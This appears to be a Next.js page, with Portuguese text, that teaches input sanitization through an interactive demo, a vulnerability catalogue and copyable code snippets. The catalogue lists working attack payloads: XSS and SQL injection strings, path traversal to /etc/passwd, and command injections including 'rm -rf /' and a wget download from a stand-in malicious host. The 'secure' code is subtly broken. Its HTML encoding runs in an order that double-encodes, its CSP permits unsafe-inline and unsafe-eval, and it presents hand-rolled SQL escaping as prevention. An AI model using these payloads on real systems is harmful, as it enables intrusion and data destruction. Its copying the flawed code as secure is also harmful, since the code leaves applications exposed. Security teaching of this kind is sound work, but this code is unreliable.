'use client';

import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { 
  Filter, 
  Shield, 
  AlertTriangle,
  CheckCircle,
  XCircle,
  Code,
  Database,
  Globe,
  Eye,
  EyeOff,
  Copy,
  Play,
  RefreshCw,
  FileText,
  Lock,
  Zap,
  Settings,
  Bug,
  Search,
  Target,
  Activity
} from 'lucide-react';
import { DemoCard } from '@/components/DemoCard';
import { DemoCardStatic } from '@/components/DemoCardStatic';
import { DemoSection } from '@/components/DemoSection';

const vulnerabilityTypes = [
  {
    name: 'Cross-Site Scripting (XSS)',
    description: 'Injeção de scripts maliciosos em páginas web',
    severity: 'High',
    impact: 'Session hijacking, data theft, malware distribution',
    examples: [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert(document.cookie)',
      '<svg onload="alert(1)">'
    ],
    prevention: ['HTML encoding', 'Content Security Policy', 'Input validation', 'Output sanitization']
  },
  {
    name: 'SQL Injection',
    description: 'Manipulação de consultas SQL através de inputs maliciosos',
    severity: 'Critical',
    impact: 'Data breach, database corruption, unauthorized access',
    examples: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM passwords --",
      "'; INSERT INTO admin VALUES('hacker') --"
    ],
    prevention: ['Prepared statements', 'Parameterized queries', 'Input validation', 'Least privilege']
  },
  {
    name: 'NoSQL Injection',
    description: 'Exploração de vulnerabilidades em bancos NoSQL',
    severity: 'High',
    impact: 'Data extraction, authentication bypass, data manipulation',
    examples: [
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      '{"$where": "this.password.length > 0"}'
    ],
    prevention: ['Input validation', 'Type checking', 'Query sanitization', 'Access controls']
  },
  {
    name: 'Command Injection',
    description: 'Execução de comandos do sistema através de inputs',
    severity: 'Critical',
    impact: 'System compromise, data theft, service disruption',
    examples: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& wget malware.com/script.sh',
      '`whoami`'
    ],
    prevention: ['Input validation', 'Command sanitization', 'Sandboxing', 'Least privilege']
  },
  {
    name: 'Path Traversal',
    description: 'Acesso não autorizado a arquivos do sistema',
    severity: 'Medium',
    impact: 'File disclosure, configuration exposure, system information leak',
    examples: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd'
    ],
    prevention: ['Path validation', 'Whitelist approach', 'Chroot jail', 'Input sanitization']
  },
  {
    name: 'LDAP Injection',
    description: 'Manipulação de consultas LDAP através de inputs',
    severity: 'Medium',
    impact: 'Authentication bypass, information disclosure, privilege escalation',
    examples: [
      '*)(uid=*))(|(uid=*',
      '*)(|(password=*))',
      '*))%00',
      '*)((|userPassword=*)'
    ],
    prevention: ['Input validation', 'LDAP encoding', 'Parameterized queries', 'Access controls']
  }
];

const sanitizationMethods = [
  {
    name: 'HTML Encoding',
    description: 'Converte caracteres especiais em entidades HTML',
    type: 'Output Encoding',
    effectiveness: 'High',
    useCase: 'Prevenção de XSS em conteúdo HTML',
    example: {
      input: '<script>alert("XSS")</script>',
      output: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
    }
  },
  {
    name: 'URL Encoding',
    description: 'Codifica caracteres especiais para uso seguro em URLs',
    type: 'Output Encoding',
    effectiveness: 'High',
    useCase: 'Parâmetros de URL e redirecionamentos',
    example: {
      input: 'user input with spaces & symbols',
      output: 'user%20input%20with%20spaces%20%26%20symbols'
    }
  },
  {
    name: 'JavaScript Encoding',
    description: 'Escapa caracteres para uso seguro em contexto JavaScript',
    type: 'Output Encoding',
    effectiveness: 'High',
    useCase: 'Dados dinâmicos em JavaScript',
    example: {
      input: 'alert("test")',
      output: 'alert(\\"test\\")'
    }
  },
  {
    name: 'CSS Encoding',
    description: 'Codifica caracteres para uso seguro em CSS',
    type: 'Output Encoding',
    effectiveness: 'Medium',
    useCase: 'Valores dinâmicos em CSS',
    example: {
      input: 'expression(alert(1))',
      output: 'expression\\28 alert\\28 1\\29 \\29'
    }
  },
  {
    name: 'Input Validation',
    description: 'Valida formato e conteúdo dos dados de entrada',
    type: 'Input Filtering',
    effectiveness: 'High',
    useCase: 'Validação de formulários e APIs',
    example: {
      input: 'user@domain.com',
      output: 'Valid email format'
    }
  },
  {
    name: 'Whitelist Filtering',
    description: 'Permite apenas caracteres ou padrões específicos',
    type: 'Input Filtering',
    effectiveness: 'Very High',
    useCase: 'Campos com formato conhecido',
    example: {
      input: 'abc123!@#',
      output: 'abc123 (only alphanumeric)'
    }
  }
];

const implementationExamples = {
  validation: `// lib/validation.ts
import { z } from 'zod';
import DOMPurify from 'dompurify';
import validator from 'validator';

// Schema validation with Zod
export const userSchema = z.object({
  name: z.string()
    .min(2, 'Nome deve ter pelo menos 2 caracteres')
    .max(50, 'Nome deve ter no máximo 50 caracteres')
    .regex(/^[a-zA-ZÀ-ÿ\s]+$/, 'Nome deve conter apenas letras'),
  
  email: z.string()
    .email('Email inválido')
    .transform(email => validator.normalizeEmail(email) || email),
  
  phone: z.string()
    .regex(/^\+?[1-9]\d{1,14}$/, 'Telefone inválido')
    .transform(phone => phone.replace(/\D/g, '')),
  
  website: z.string()
    .url('URL inválida')
    .optional()
    .transform(url => url ? validator.escape(url) : undefined),
  
  bio: z.string()
    .max(500, 'Bio deve ter no máximo 500 caracteres')
    .transform(bio => DOMPurify.sanitize(bio, { ALLOWED_TAGS: [] }))
});

// SQL injection prevention
export function sanitizeForSQL(input: string): string {
  return input
    .replace(/'/g, "''")
    .replace(/\\/g, '\\\\')
    .replace(/\x00/g, '\\0')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\x1a/g, '\\Z');
}

// XSS prevention
export function sanitizeHTML(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true
  });
}

// Command injection prevention
export function sanitizeCommand(input: string): string {
  // Remove dangerous characters
  let result = input;
  
  // Remove semicolons, ampersands, pipes
  result = result.split(';').join('');
  result = result.split('&').join('');
  result = result.split('|').join('');
  
  // Remove backticks and brackets
  result = result.split(String.fromCharCode(96)).join(''); // backtick
  result = result.split('<').join('');
  result = result.split('>').join('');
  result = result.split('(').join('');
  result = result.split(')').join('');
  result = result.split('{').join('');
  result = result.split('}').join('');
  result = result.split('[').join('');
  result = result.split(']').join('');
  result = result.split('$').join('');
  
  return result;
}

// Path traversal prevention
export function sanitizePath(input: string): string {
  return input
    .replace(/\.\./g, '')
    .replace(/[^a-zA-Z0-9._-]/g, '')
    .substring(0, 255);
}

// NoSQL injection prevention
export function sanitizeNoSQL(input: unknown): unknown {
  if (typeof input === 'string') {
    return input.split('$').join('').split('{').join('').split('}').join('');
  }
  
  if (typeof input === 'object' && input !== null) {
    const sanitized: Record<string, unknown> = {};
    for (const [key, value] of Object.entries(input)) {
      if (!key.startsWith('$')) {
        sanitized[key] = sanitizeNoSQL(value);
      }
    }
    return sanitized;
  }
  
  return input;
}`,
  middleware: `// middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import rateLimit from 'express-rate-limit';

// Content Security Policy
const CSP_HEADER = \`
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
\`.replace(/\n/g, ' ').trim();

export function middleware(request: NextRequest) {
  const response = NextResponse.next();
  
  // Security headers
  response.headers.set('Content-Security-Policy', CSP_HEADER);
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-XSS-Protection', '1; mode=block');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Input size limits
  const contentLength = request.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > 10 * 1024 * 1024) { // 10MB
    return new NextResponse('Payload too large', { status: 413 });
  }
  
  // Suspicious pattern detection
  const url = request.nextUrl.toString();
  const suspiciousPatterns = [
    /<script[^>]*>.*?<\/script>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi,
    /\.\.\//g,
    /union\s+select/gi,
    /drop\s+table/gi
  ];
  
  for (const pattern of suspiciousPatterns) {
    if (pattern.test(url)) {
      console.warn('Suspicious request detected:', url);
      return new NextResponse('Forbidden', { status: 403 });
    }
  }
  
  return response;
}

export const config = {
  matcher: [
    '/((?!api/|_next/|_static/|_vercel|[\\w-]+\\.\\w+).*)',
  ],
};`,
  hooks: `// hooks/useSanitization.ts
import { useState, useCallback } from 'react';
import { userSchema } from '@/lib/validation';
import DOMPurify from 'dompurify';

interface SanitizationResult {
  isValid: boolean;
  sanitized: any;
  errors: string[];
}

export function useSanitization() {
  const [isValidating, setIsValidating] = useState(false);
  
  const sanitizeAndValidate = useCallback(async (
    data: any,
    schema = userSchema
  ): Promise<SanitizationResult> => {
    setIsValidating(true);
    
    try {
      // Basic sanitization
      const sanitized = sanitizeObject(data);
      
      // Schema validation
      const result = await schema.safeParseAsync(sanitized);
      
      if (result.success) {
        return {
          isValid: true,
          sanitized: result.data,
          errors: []
        };
      } else {
        return {
          isValid: false,
          sanitized: data,
          errors: result.error.errors.map(err => err.message)
        };
      }
    } catch (error) {
      return {
        isValid: false,
        sanitized: data,
        errors: ['Validation error occurred']
      };
    } finally {
      setIsValidating(false);
    }
  }, []);
  
  const sanitizeHTML = useCallback((html: string): string => {
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
      ALLOWED_ATTR: ['href', 'title'],
      KEEP_CONTENT: true
    });
  }, []);
  
  const sanitizeText = useCallback((text: string): string => {
    return text
      .replace(/[<>"'&]/g, (char) => {
        const entities: { [key: string]: string } = {
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#x27;',
          '&': '&amp;'
        };
        return entities[char] || char;
      })
      .trim();
  }, []);
  
  const sanitizeURL = useCallback((url: string): string => {
    try {
      const parsed = new URL(url);
      // Only allow http and https protocols
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        return '';
      }
      return parsed.toString();
    } catch {
      return '';
    }
  }, []);
  
  return {
    sanitizeAndValidate,
    sanitizeHTML,
    sanitizeText,
    sanitizeURL,
    isValidating
  };
}

function sanitizeObject(obj: unknown): unknown {
  if (typeof obj === 'string') {
    return obj.trim().substring(0, 10000); // Limit string length
  }
  
  if (Array.isArray(obj)) {
    return obj.slice(0, 100).map(sanitizeObject); // Limit array size
  }
  
  if (typeof obj === 'object' && obj !== null) {
    const sanitized: Record<string, unknown> = {};
    let count = 0;
    
    for (const [key, value] of Object.entries(obj)) {
      if (count >= 50) break; // Limit object properties
      
      const sanitizedKey = key.replace(/[^a-zA-Z0-9_]/g, '').substring(0, 100);
      if (sanitizedKey) {
        sanitized[sanitizedKey] = sanitizeObject(value);
        count++;
      }
    }
    
    return sanitized;
  }
  
  return obj;
}`,
  api: `// app/api/sanitize/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { userSchema, sanitizeHTML } from '@/lib/validation';
import rateLimit from '@/lib/rate-limit';

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

export async function POST(request: NextRequest) {
  // Apply rate limiting
  const rateLimitResult = await limiter(request);
  if (!rateLimitResult.success) {
    return NextResponse.json(
      { error: 'Too many requests' },
      { status: 429 }
    );
  }
  
  try {
    const body = await request.json();
    
    // Input size validation
    const bodySize = JSON.stringify(body).length;
    if (bodySize > 100000) { // 100KB limit
      return NextResponse.json(
        { error: 'Request body too large' },
        { status: 413 }
      );
    }
    
    // Sanitize and validate
    const result = await userSchema.safeParseAsync(body);
    
    if (!result.success) {
      return NextResponse.json(
        {
          error: 'Validation failed',
          details: result.error.errors
        },
        { status: 400 }
      );
    }
    
    // Additional HTML sanitization for rich text fields
    const sanitizedData = {
      ...result.data,
      bio: result.data.bio ? sanitizeHTML(result.data.bio) : undefined
    };
    
    // Log successful sanitization
    console.log('Data sanitized successfully:', {
      timestamp: new Date().toISOString(),
      ip: request.ip,
      userAgent: request.headers.get('user-agent'),
      dataSize: bodySize
    });
    
    return NextResponse.json({
      success: true,
      data: sanitizedData,
      message: 'Data sanitized and validated successfully'
    });
    
  } catch (error) {
    console.error('Sanitization error:', error);
    
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

// Health check endpoint
export async function GET() {
  return NextResponse.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    sanitization: 'active'
  });
}`
};

export default function InputSanitizationPage() {
  const [selectedVulnerability, setSelectedVulnerability] = useState(0);
  const [selectedMethod, setSelectedMethod] = useState(0);
  const [selectedCode, setSelectedCode] = useState<keyof typeof implementationExamples>('validation');
  const [testInput, setTestInput] = useState('');
  const [sanitizedOutput, setSanitizedOutput] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [detectedThreats, setDetectedThreats] = useState<string[]>([]);

  const testInputs = [
    '<script>alert("XSS")</script>',
    "'; DROP TABLE users; --",
    '../../../etc/passwd',
    'user@domain.com',
    'Normal text input'
  ];

  const simulateSanitization = (input: string) => {
    setIsProcessing(true);
    
    setTimeout(() => {
      const threats: string[] = [];
      let output = input;
      
      // Detect XSS
      if (/<script[^>]*>.*?<\/script>/gi.test(input) || /javascript:/gi.test(input)) {
        threats.push('XSS Attempt');
        output = output.replace(/<script[^>]*>.*?<\/script>/gi, '[SCRIPT_REMOVED]');
        output = output.replace(/javascript:/gi, '[JAVASCRIPT_REMOVED]');
      }
      
      // Detect SQL Injection
      if (/('|(\-\-)|(;)|(\||\|)|(\*|\*))/gi.test(input)) {
        threats.push('SQL Injection');
        output = output.replace(/'/g, "''");
        output = output.replace(/--/g, '[COMMENT_REMOVED]');
      }
      
      // Detect Path Traversal
      if (/\.\./g.test(input)) {
        threats.push('Path Traversal');
        output = output.replace(/\.\./g, '[PATH_TRAVERSAL_REMOVED]');
      }
      
      // HTML encoding
      output = output
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/&/g, '&amp;');
      
      setDetectedThreats(threats);
      setSanitizedOutput(output);
      setIsProcessing(false);
    }, 1000);
  };

  const getSeverityColor = (severity: string) => {
    switch (severity.toLowerCase()) {
      case 'critical': return 'text-red-600 bg-red-100 dark:bg-red-900 dark:text-red-300';
      case 'high': return 'text-orange-600 bg-orange-100 dark:bg-orange-900 dark:text-orange-300';
      case 'medium': return 'text-yellow-600 bg-yellow-100 dark:bg-yellow-900 dark:text-yellow-300';
      case 'low': return 'text-green-600 bg-green-100 dark:bg-green-900 dark:text-green-300';
      default: return 'text-gray-600 bg-gray-100 dark:bg-gray-700 dark:text-gray-300';
    }
  };

  const getEffectivenessColor = (level: string) => {
    switch (level.toLowerCase()) {
      case 'very high': return 'text-green-600 bg-green-100 dark:bg-green-900 dark:text-green-300';
      case 'high': return 'text-green-600 bg-green-100 dark:bg-green-900 dark:text-green-300';
      case 'medium': return 'text-yellow-600 bg-yellow-100 dark:bg-yellow-900 dark:text-yellow-300';
      case 'low': return 'text-red-600 bg-red-100 dark:bg-red-900 dark:text-red-300';
      default: return 'text-gray-600 bg-gray-100 dark:bg-gray-700 dark:text-gray-300';
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-green-50 to-emerald-50 dark:from-gray-900 dark:via-gray-800 dark:to-gray-900">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <motion.div 
          className="text-center mb-12"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
        >
          <div className="flex items-center justify-center mb-4">
            <div className="p-3 bg-gradient-to-br from-green-500 to-emerald-600 rounded-xl text-white mr-4">
              <Filter className="h-8 w-8" />
            </div>
            <h1 className="text-5xl font-bold text-gray-900 dark:text-white">
              Input Sanitization
            </h1>
          </div>
          <p className="text-xl text-gray-600 dark:text-gray-300 max-w-3xl mx-auto">
            Proteja sua aplicação contra ataques de injeção com validação robusta, 
            sanitização de entrada e codificação de saída.
          </p>
        </motion.div>

        {/* Interactive Sanitization Demo */}
        <DemoSection title="Demo Interativa" description="Teste a sanitização de entrada em tempo real">
          <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6">
            <div className="grid lg:grid-cols-2 gap-8">
              <div>
                <h3 className="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                  Input de Teste
                </h3>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Digite ou selecione um input:
                    </label>
                    <textarea
                      value={testInput}
                      onChange={(e) => setTestInput(e.target.value)}
                      className="w-full h-24 p-3 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                      placeholder="Digite algo para testar..."
                    />
                  </div>
                  
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Exemplos de teste:
                    </label>
                    <div className="grid grid-cols-1 gap-2">
                      {testInputs.map((example, index) => (
                        <button
                          key={index}
                          onClick={() => setTestInput(example)}
                          className="text-left p-2 bg-gray-50 dark:bg-gray-700 rounded border hover:bg-gray-100 dark:hover:bg-gray-600 transition-colors"
                        >
                          <code className="text-sm text-gray-700 dark:text-gray-300">
                            {example}
                          </code>
                        </button>
                      ))}
                    </div>
                  </div>
                  
                  <button
                    onClick={() => simulateSanitization(testInput)}
                    disabled={!testInput || isProcessing}
                    className="w-full bg-green-600 text-white py-2 px-4 rounded-lg hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center justify-center"
                  >
                    {isProcessing ? (
                      <RefreshCw className="h-4 w-4 mr-2 animate-spin" />
                    ) : (
                      <Play className="h-4 w-4 mr-2" />
                    )}
                    {isProcessing ? 'Processando...' : 'Sanitizar Input'}
                  </button>
                </div>
              </div>
              
              <div>
                <h3 className="text-lg font-semibold mb-4 text-gray-900 dark:text-white">
                  Resultado da Sanitização
                </h3>
                
                <div className="space-y-4">
                  {detectedThreats.length > 0 && (
                    <div className="p-4 bg-red-50 dark:bg-red-900/20 rounded-lg">
                      <h4 className="font-medium text-red-900 dark:text-red-300 mb-2">
                        Ameaças Detectadas:
                      </h4>
                      <ul className="space-y-1">
                        {detectedThreats.map((threat, index) => (
                          <li key={index} className="flex items-center text-red-700 dark:text-red-400 text-sm">
                            <AlertTriangle className="h-4 w-4 mr-2 flex-shrink-0" />
                            {threat}
                          </li>
                        ))}
                      </ul>
                    </div>
                  )}
                  
                  <div>
                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Output Sanitizado:
                    </label>
                    <div className="p-3 bg-gray-50 dark:bg-gray-700 rounded-lg border min-h-[100px]">
                      <code className="text-sm text-gray-900 dark:text-white whitespace-pre-wrap">
                        {sanitizedOutput || 'Resultado aparecerá aqui...'}
                      </code>
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center p-3 bg-blue-50 dark:bg-blue-900/20 rounded-lg">
                      <div className="text-lg font-bold text-blue-600 dark:text-blue-400">
                        {detectedThreats.length}
                      </div>
                      <div className="text-sm text-blue-700 dark:text-blue-300">
                        Ameaças Bloqueadas
                      </div>
                    </div>
                    <div className="text-center p-3 bg-green-50 dark:bg-green-900/20 rounded-lg">
                      <div className="text-lg font-bold text-green-600 dark:text-green-400">
                        {sanitizedOutput ? 'Seguro' : 'Aguardando'}
                      </div>
                      <div className="text-sm text-green-700 dark:text-green-300">
                        Status
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </DemoSection>

        {/* Vulnerability Types */}
        <DemoSection title="Tipos de Vulnerabilidades" description="Principais ameaças de injeção e como preveni-las">
          <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg overflow-hidden">
            <div className="border-b border-gray-200 dark:border-gray-700">
              <nav className="flex space-x-4 px-6 overflow-x-auto">
                {vulnerabilityTypes.map((vuln, index) => (
                  <button
                    key={vuln.name}
                    onClick={() => setSelectedVulnerability(index)}
                    className={`py-4 px-3 border-b-2 font-medium text-sm whitespace-nowrap transition-colors ${
                      selectedVulnerability === index
                        ? 'border-green-500 text-green-600 dark:text-green-400'
                        : 'border-transparent text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300'
                    }`}
                  >
                    {vuln.name}
                  </button>
                ))}
              </nav>
            </div>
            
            <div className="p-6">
              <div className="grid lg:grid-cols-2 gap-8">
                <div>
                  <div className="flex items-center space-x-3 mb-4">
                    <h3 className="text-xl font-semibold text-gray-900 dark:text-white">
                      {vulnerabilityTypes[selectedVulnerability].name}
                    </h3>
                    <span className={`px-2 py-1 rounded text-xs font-medium ${getSeverityColor(vulnerabilityTypes[selectedVulnerability].severity)}`}>
                      {vulnerabilityTypes[selectedVulnerability].severity.toUpperCase()}
                    </span>
                  </div>
                  
                  <p className="text-gray-600 dark:text-gray-300 mb-6">
                    {vulnerabilityTypes[selectedVulnerability].description}
                  </p>
                  
                  <div className="space-y-4">
                    <div className="p-4 bg-red-50 dark:bg-red-900/20 rounded-lg">
                      <h4 className="font-medium text-red-900 dark:text-red-300 mb-2">
                        Impacto:
                      </h4>
                      <p className="text-red-700 dark:text-red-400 text-sm">
                        {vulnerabilityTypes[selectedVulnerability].impact}
                      </p>
                    </div>
                    
                    <div className="p-4 bg-yellow-50 dark:bg-yellow-900/20 rounded-lg">
                      <h4 className="font-medium text-yellow-900 dark:text-yellow-300 mb-2">
                        Exemplos de Payloads:
                      </h4>
                      <div className="space-y-2">
                        {vulnerabilityTypes[selectedVulnerability].examples.map((example, idx) => (
                          <div key={idx} className="bg-gray-900 rounded p-2">
                            <code className="text-yellow-400 text-xs">{example}</code>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
                    Métodos de Prevenção
                  </h4>
                  <div className="space-y-3">
                    {vulnerabilityTypes[selectedVulnerability].prevention.map((method, index) => (
                      <div key={index} className="flex items-start space-x-3 p-3 bg-green-50 dark:bg-green-900/20 rounded-lg">
                        <Shield className="h-5 w-5 text-green-500 mt-0.5 flex-shrink-0" />
                        <span className="text-green-700 dark:text-green-300">{method}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </DemoSection>

        {/* Sanitization Methods */}
        <DemoSection title="Métodos de Sanitização" description="Técnicas para limpar e validar dados de entrada">
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
            {sanitizationMethods.map((method, index) => (
              <motion.div
                key={method.name}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1, duration: 0.5 }}
                className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg border border-gray-200 dark:border-gray-700"
              >
                <div className="flex items-start justify-between mb-4">
                  <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                    {method.name}
                  </h3>
                  <span className={`px-2 py-1 rounded text-xs font-medium ${getEffectivenessColor(method.effectiveness)}`}>
                    {method.effectiveness}
                  </span>
                </div>
                
                <p className="text-gray-600 dark:text-gray-300 mb-4">
                  {method.description}
                </p>
                
                <div className="space-y-3">
                  <div>
                    <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
                      Tipo: 
                    </span>
                    <span className="text-sm text-blue-600 dark:text-blue-400">
                      {method.type}
                    </span>
                  </div>
                  
                  <div>
                    <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
                      Uso: 
                    </span>
                    <span className="text-sm text-purple-600 dark:text-purple-400">
                      {method.useCase}
                    </span>
                  </div>
                  
                  <div className="p-3 bg-gray-50 dark:bg-gray-700 rounded-lg">
                    <div className="text-xs font-medium text-gray-700 dark:text-gray-300 mb-2">
                      Exemplo:
                    </div>
                    <div className="space-y-2">
                      <div>
                        <span className="text-xs text-red-600 dark:text-red-400">Input:</span>
                        <div className="bg-red-50 dark:bg-red-900/20 p-1 rounded text-xs font-mono">
                          {method.example.input}
                        </div>
                      </div>
                      <div>
                        <span className="text-xs text-green-600 dark:text-green-400">Output:</span>
                        <div className="bg-green-50 dark:bg-green-900/20 p-1 rounded text-xs font-mono">
                          {method.example.output}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            ))}
          </div>
        </DemoSection>

        {/* Implementation Examples */}
        <DemoSection title="Exemplos de Implementação" description="Código prático para sanitização robusta">
          <div className="bg-white dark:bg-gray-800 rounded-xl shadow-lg overflow-hidden">
            <div className="border-b border-gray-200 dark:border-gray-700">
              <nav className="flex space-x-8 px-6 overflow-x-auto">
                {Object.keys(implementationExamples).map((key) => (
                  <button
                    key={key}
                    onClick={() => setSelectedCode(key as keyof typeof implementationExamples)}
                    className={`py-4 px-1 border-b-2 font-medium text-sm whitespace-nowrap transition-colors ${
                      selectedCode === key
                        ? 'border-green-500 text-green-600 dark:text-green-400'
                        : 'border-transparent text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300'
                    }`}
                  >
                    {key.charAt(0).toUpperCase() + key.slice(1)}
                  </button>
                ))}
              </nav>
            </div>
            
            <div className="p-6">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                  {selectedCode.charAt(0).toUpperCase() + selectedCode.slice(1)} Implementation
                </h3>
                <button
                  onClick={() => navigator.clipboard.writeText(implementationExamples[selectedCode])}
                  className="flex items-center space-x-2 text-green-600 hover:text-green-700 dark:text-green-400"
                >
                  <Copy className="h-4 w-4" />
                  <span className="text-sm">Copiar</span>
                </button>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-4 overflow-x-auto">
                <pre className="text-sm text-gray-300">
                  <code>{implementationExamples[selectedCode]}</code>
                </pre>
              </div>
            </div>
          </div>
        </DemoSection>

        {/* Best Practices */}
        <DemoSection title="Melhores Práticas" description="Diretrizes para sanitização efetiva">
          <div className="bg-white dark:bg-gray-800 rounded-xl p-8 shadow-lg">
            <div className="grid md:grid-cols-3 gap-8">
              <div>
                <h3 className="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                  <Filter className="h-5 w-5 mr-2 text-green-500" />
                  Validação de Entrada
                </h3>
                <ul className="space-y-2 text-gray-700 dark:text-gray-300">
                  <li>• Valide no cliente e servidor</li>
                  <li>• Use whitelist ao invés de blacklist</li>
                  <li>• Implemente limites de tamanho</li>
                  <li>• Valide tipos de dados</li>
                  <li>• Use regex para formatos específicos</li>
                  <li>• Rejeite caracteres perigosos</li>
                </ul>
              </div>
              <div>
                <h3 className="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                  <Code className="h-5 w-5 mr-2 text-blue-500" />
                  Codificação de Saída
                </h3>
                <ul className="space-y-2 text-gray-700 dark:text-gray-300">
                  <li>• Encode baseado no contexto</li>
                  <li>• Use bibliotecas confiáveis</li>
                  <li>• Escape caracteres especiais</li>
                  <li>• Configure CSP headers</li>
                  <li>• Sanitize HTML quando necessário</li>
                  <li>• Valide URLs e links</li>
                </ul>
              </div>
              <div>
                <h3 className="text-lg font-semibold mb-4 text-gray-900 dark:text-white flex items-center">
                  <Shield className="h-5 w-5 mr-2 text-purple-500" />
                  Segurança Geral
                </h3>
                <ul className="space-y-2 text-gray-700 dark:text-gray-300">
                  <li>• Use prepared statements</li>
                  <li>• Implemente rate limiting</li>
                  <li>• Configure logs de segurança</li>
                  <li>• Monitore tentativas de ataque</li>
                  <li>• Mantenha bibliotecas atualizadas</li>
                  <li>• Realize testes de penetração</li>
                </ul>
              </div>
            </div>
          </div>
        </DemoSection>
      </div>
    </div>
  );
}